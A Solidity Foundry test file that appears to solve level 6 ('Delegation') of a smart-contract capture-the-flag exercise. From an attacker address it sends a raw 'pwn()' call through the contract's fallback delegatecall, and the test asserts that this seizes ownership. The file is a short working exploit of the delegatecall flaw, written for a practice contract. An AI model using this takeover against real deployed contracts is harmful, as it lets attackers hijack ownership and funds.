//SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;
import {Delegate} from "src/level6.sol";
import {Delegation} from "src/level6.sol";
import {Test} from "forge-std/Test.sol";

contract Level6Test is Test {
    Delegation public delegation;
    Delegate public delegate;
    address public attacker = makeAddr("attacker");
    address public owner = makeAddr("owner");
    address public player = makeAddr("player");

    constructor() {
        vm.startPrank(player);
        delegate = new Delegate(owner);
        delegation = new Delegation(address(delegate));
        vm.stopPrank();
    }

    function test_attack() public {
        vm.startPrank(attacker);
        (bool success, ) = address(delegation).call(
            abi.encodeWithSignature("pwn()")
        );
        require(success, "Call failed");
        assertEq(delegation.owner(), attacker, "Attacker is not the owner");
        vm.stopPrank();
    }
}
